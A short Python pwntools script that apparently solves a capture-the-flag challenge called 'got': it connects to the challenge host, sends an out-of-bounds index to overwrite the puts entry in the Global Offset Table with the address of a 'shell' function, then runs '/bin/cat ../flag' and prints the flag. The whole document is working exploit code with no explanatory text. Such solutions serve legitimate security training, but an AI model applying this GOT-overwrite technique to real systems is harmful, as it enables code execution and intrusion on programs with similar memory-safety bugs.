#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./got/got", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b")
p = remote("got-065efd964a19db36.deploy.phreaks.fr", 443, ssl=True)

p.readuntil(b"> ")
p.sendline(str((elf.got["puts"] - elf.sym["PNJs"]) >> 5).encode())

p.readuntil(b"> ")
p.sendline(p64(0) + p64(elf.sym["shell"]))

p.sendline(b"/bin/cat ../flag")
flag = p.readuntil(b"}")
print(flag.decode()) # PWNME{G0t_Ov3Rwr1t3_fTW__}
